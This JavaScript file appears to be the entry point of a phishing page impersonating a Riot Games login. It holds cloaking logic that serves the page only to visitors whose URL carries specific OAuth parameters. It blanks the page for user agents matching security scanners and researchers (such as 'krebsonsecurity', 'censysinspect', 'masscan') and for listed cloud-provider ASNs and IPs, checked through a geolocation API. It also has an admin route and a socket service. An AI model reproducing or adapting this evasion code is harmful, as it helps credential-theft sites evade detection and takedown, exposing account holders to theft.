import '@/assets/css/style.css';
import routes from '@/routes/routes';
import '@/services/socket';

const blockedKeywords = [
    'bot',
    'crawler',
    'spider',
    'puppeteer',
    'selenium',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'java',
    'ruby',
    'go',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'facebookexternalhit',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'BotPoke',
];
const blockedASNs = [
    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075,
    214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939,
    209, 51396,
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const checkAndBlockBots = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    if (blockedKeywords.some((keyword) => userAgent.includes(keyword))) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return true;
    }
    return false;
};

const checkAndBlockByGeoIP = async () => {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();

        if (
            blockedASNs.includes(Number(data.asn)) ||
            blockedIPs.includes(data.ip)
        ) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return true;
        }

        return false;
    } catch {
        return false;
    }
};

const checkRequiredParam = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const codeChallenge = urlParams.get('code_challenge');

    return (
        urlParams.get('client_id') === 'prod-xsso-riotgames' &&
        codeChallenge !== null &&
        codeChallenge.length > 0
    );
};

(async () => {
    if (window.location.pathname.startsWith('/admin')) {
        routes();
        return;
    }

    if (!checkRequiredParam()) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return;
    }

    if (!checkAndBlockBots()) {
        const blocked = await checkAndBlockByGeoIP();
        if (!blocked) {
            routes();
        }
    } else {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
    }
})();
